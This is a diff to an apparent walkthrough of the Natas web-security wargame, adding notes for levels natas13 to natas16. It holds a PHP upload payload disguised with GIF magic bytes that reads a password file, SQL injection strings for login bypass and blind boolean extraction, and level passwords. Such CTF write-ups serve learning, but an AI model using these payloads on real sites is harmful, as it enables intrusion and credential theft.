@@ -53,14 +53,19 @@
   * Change its extension to _.php_ before uploading it (**trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC**)
 * natas13
   * Same as previous, but we need to pass the PHP `exif_imagetype()` checking method
+  * See <https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack>
   * That can be achieved by spoofing a file's [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)
   * Tried prepending some binary JPG & PNG signatures but they were rejected, however GIF format worked
   * Create a file (with any extension) and this content: `GIF87a <?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>`
   * Change its extension to _.php_ before uploading it (**z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ**)
 * natas14
-  * `" OR 1=1 #` or <code>" OR 1=1 -- </code> (note the mandatory trailing space for MySQL to consider it an actual comment, **SdqIqBsFcz3yotlNYErZSZwblkm0lrvx**)
+  * `" OR 1=1 #` or <code>" OR 1=1 -- </code> (notice the mandatory trailing space for MySQL to consider it an actual comment, **SdqIqBsFcz3yotlNYErZSZwblkm0lrvx**)
 * natas15
+  * `natas16` = displays a different result when user exists (blind boolean SQLi) so now we need his password
+  * `natas16" AND STRCMP(password COLLATE utf8mb4_bin, 'h' COLLATE utf8mb4_bin) = 1 #` = brute-forcing it manually via dichotomic string comparison, but still going to take a while
+  * Create a brute-force script that HTTP Post all password combinations (**hPkjKYviLQctEW33QmuXL6eDVfMW4sGo**)
 * natas16
+  * ``` ; | & ` ' " ``` = cannot use one of those
 * natas17
 * natas18
 * natas19
